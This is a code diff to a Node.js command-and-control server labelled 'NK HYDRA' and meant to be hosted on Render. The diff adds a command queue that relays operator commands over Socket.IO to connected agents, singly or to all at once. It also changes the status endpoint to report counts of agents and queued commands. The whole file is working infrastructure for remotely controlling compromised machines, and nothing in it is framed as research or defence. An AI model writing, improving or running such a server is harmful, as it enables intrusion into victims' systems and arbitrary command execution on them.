@@ -1,5 +1,5 @@
 // TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
-// NK HYDRA v120.0 [QUANTUM STABLE]
+// NK HYDRA v132.0 [GOD MODE STABLE QUEUE]
 
 const express = require('express');
 const http = require('http');
@@ -18,18 +18,60 @@ process.on('unhandledRejection', (reason, promise) => {
 const app = express();
 app.use(cors());
 
-app.get('/', (req, res) => { res.send('HYDRA C2 v120.0 [STABLE]'); });
+app.get('/', (req, res) => { 
+    res.json({ 
+        status: 'online', 
+        version: 'v132.0', 
+        agents: agents.length,
+        queue: commandQueue.length
+    }); 
+});
 
 const server = http.createServer(app);
 const io = new Server(server, { 
     cors: { origin: "*", methods: ["GET", "POST"] },
-    // Render defaults: 25s interval, 60s timeout
     pingInterval: 25000, 
     pingTimeout: 60000,
     transports: ['polling', 'websocket'] 
 });
 
 let agents = []; 
+
+// --- COMMAND QUEUE SYSTEM (RENDER STABILITY) ---
+// Prevents server crash when broadcasting 50+ commands instantly
+const commandQueue = [];
+let isProcessingQueue = false;
+
+const processQueue = async () => {
+    if (isProcessingQueue || commandQueue.length === 0) return;
+    isProcessingQueue = true;
+
+    while (commandQueue.length > 0) {
+        const task = commandQueue.shift();
+        if (task) {
+            try {
+                // Execute Task
+                if (task.targetId === 'all') {
+                    io.emit('exec_cmd', { cmd: task.cmd });
+                } else {
+                    const agent = agents.find(a => a.id === task.targetId);
+                    if (agent && agent.socketId) {
+                         io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd });
+                    }
+                }
+                // Log only occasionally to save bandwidth
+                if (Math.random() > 0.8) {
+                    io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `Processing Queue: ${task.cmd}` });
+                }
+            } catch (e) {
+                console.error("Queue Exec Error:", e);
+            }
+        }
+        // Artificial Delay to prevent CPU Spike on Render Free Tier
+        await new Promise(r => setTimeout(r, 150)); 
+    }
+    isProcessingQueue = false;
+};
 
 io.on('connection', (socket) => {
     
@@ -62,26 +104,15 @@ io.on('connection', (socket) => {
     socket.on('exec_cmd', (data) => {
         try {
             const { targetId, cmd } = data;
-            console.log(`[CMD] ${cmd} -> ${targetId}`);
+            // PUSH TO QUEUE INSTEAD OF EXECUTING IMMEDIATELY
+            commandQueue.push({ targetId, cmd });
+            console.log(`[QUEUE] ${cmd} -> ${targetId} (Size: ${commandQueue.length})`);
             
-            io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `TX: ${cmd}` });
+            io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `Queued: ${cmd}` });
+            
+            // Trigger processing
+            processQueue();
 
-            if (targetId === 'all') {
-                agents.forEach(agent => {
-                    if (agent.status === 'Online' && agent.socketId) {
-                        try {
-                            io.to(agent.socketId).emit('exec_cmd', { cmd });
-                        } catch (err) {
-                            console.error(`Failed to send to ${agent.id}: `, err.message);
-                        }
-                    }
-                });
-            } else {
-                const target = agents.find(a => a.id === targetId);
-                if (target && target.status === 'Online') {
-                    io.to(target.socketId).emit('exec_cmd', { cmd });
-                }
-            }
         } catch (e) {
             console.error("Exec Error:", e);
         }
@@ -103,4 +134,5 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v120 LISTENING ON ${PORT}`));
+server.listen(PORT, () => console.log(`HYDRA v132 LISTENING ON ${PORT}`));
+
